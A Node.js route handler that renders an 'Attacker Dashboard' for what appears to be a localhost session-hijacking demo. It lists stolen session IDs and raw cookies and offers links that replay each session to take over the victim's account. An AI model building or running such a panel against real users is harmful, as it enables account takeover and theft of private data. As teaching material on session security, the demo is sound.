const stolenSessions = require("../db/stolenSessions");

exports.getStolenSessionsPage = (req, res) => {
  res.send(`
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Attacker Dashboard</title>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body { font-family: 'Segoe UI', sans-serif; background: #0a0a0a; color: #e2e8f0; padding: 40px; }
    h1 { color: #ef4444; margin-bottom: 8px; }
    .sub { color: #6b7280; margin-bottom: 32px; font-size: 14px; }
    .session-card {
      background: #111; border: 1px solid #1f1f1f;
      border-left: 4px solid #ef4444;
      border-radius: 8px; padding: 20px; margin-bottom: 16px;
    }
    .session-id { font-family: monospace; color: #a3e635; font-size: 14px; margin-bottom: 8px; }
    .meta { color: #6b7280; font-size: 12px; }
    .use-btn {
      display: inline-block; margin-top: 12px;
      background: #ef4444; color: white; padding: 8px 16px;
      border-radius: 6px; text-decoration: none; font-size: 13px; font-weight: 600;
    }
    .empty { color: #374151; text-align: center; padding: 60px; font-size: 18px; }
  </style>
</head>
<body>
  <h1>💀 Attacker Dashboard</h1>
  <p class="sub">Stolen sessions from victims — Port 4000</p>

  ${
    stolenSessions.length === 0
      ? '<div class="empty">No sessions stolen yet.<br>Get a victim to visit port 3000, login, then visit port 4000.</div>'
      : stolenSessions
          .map(
            (s, i) => `
        <div class="session-card">
          <div class="session-id">Session #${i + 1}: ${s.sessionId}</div>
          <div class="meta">Stolen at: ${s.timestamp}</div>
          <div class="meta">Raw cookies: ${s.rawCookies}</div>
          <a class="use-btn"
             href="http://localhost:3000/profile?session=${s.sessionId}"
             target="_blank">
            🔓 Use to Access Account →
          </a>
        </div>
      `,
          )
          .join("")
  }
</body>
</html>
  `);
};
